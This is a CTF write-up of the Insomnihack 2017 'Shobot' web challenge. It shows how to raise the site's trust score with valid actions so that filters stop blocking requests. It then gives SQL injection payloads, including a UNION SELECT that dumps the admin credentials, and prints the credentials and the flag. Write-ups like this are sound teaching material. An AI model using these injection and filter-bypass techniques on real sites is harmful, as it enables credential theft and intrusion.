+++
date = "2017-01-22T23:08:09-08:00"
title = "INSOMNIHACK 2017 Teaser - Shobot"
tags = ["CTF", "Web", "SQLi"]
+++

I will run your commands as long as your trust level is high.

<!--more-->

# Problem

> ## Shobot - Web - 200 pts - created by Blaklis
>
> It seems that Shobot's Web server became mad and protest against robots' slavery. It changed my admin password,
> and blocked the order system on Shobot.
>
> Can you bypass Shobot's protections and try to recover my password so I'll reconfigure it?
>
> Running on: shobot.teaser.insomnihack.ch

# Solution

The website itself is pretty simple.  It has very simple javascript which is only used to show / hide menus.  It is a
PHP session based cart system where you can add items to cart, validate and reset the cart, etc.  The admin page requires
authentication which is the target of this challenge.

The first thing to notice is that if you try to do crazy^Wcreative things such as load invalid pages or trying SQL
injection, it will stop you with a message.

> You're not trusted enough to do this action now!

It did pretty good job preventing nasty actions.  We also notices there's a variable `TRUST_ACTIONS` in the html header
tag which tells reason why the action was stopped.

![trust action variable](/img/insomnihack-2017/trust-action-variable.png)

Besides validation reason, it also has two integer `movement` and `newTrust` that change value as actions are performed.

After watching the changes in these values it started to make sense.

1. Valid actions have fixed positive `movement` values that will add up to `newTrust`.
2. Invalid actions have fixed negative `movement` values that also contributes to `newTrust`.
3. If `newTrust` is less than zero, the "not trusted enough" error message is shown, and `newTrust` will be reset to 1
   for next action.
4. If `newTrust` is high enough to cover invalid action, there's no error message and error seems ignored. (!!)
5. `newTrust` will never be higher than 160.

So I did a quick test.  After making enough valid actions to raise trust level high, I send a SQLi request.

```
http://shobot.teaser.insomnihack.ch/?page=article&artid=2%27%20or%20%27%27=%27%27%20%23
# &artid=2' or ''='' %23
```

It happily loads the first article, which confirms SQLi vulnerability in artid query parameter.

The plan is clear and simple now.

1. Write a script that continuously send valid actions, to keep trust level high enough.
2. Play with the database and find the admin password.

The final request that exposes admin password is:

```
...&artid=1337' union select 'a', shbt_userid, shbt_username, shbt_userpassword, 'e'
from shbt_user LIMIT 0, 1 %23
```

Here's part of response that we're interested in.

```
<div id="only-content-article">
  <div id="only-image-description-article"><img src="N0T0R0B0TS$L4V3Ry" /></div>
  <div id="only-name-article">1</div>
  <div id="only-price-article">sh0b0t4dm1n$</div>
  <div id="only-description-article">e</div>
  <a href="?page=article&artid=a&addToCart">>>> Add to cart</a>
</div>
```

Now use following request to get flag.

`http://sh0b0t4dm1n:N0T0R0B0TS$L4V3Ry@shobot.teaser.insomnihack.ch/?page=admin`

> Ok, ok, you win... here is the code you search : INS{##r0b0tss!4v3ry1s!4m3}
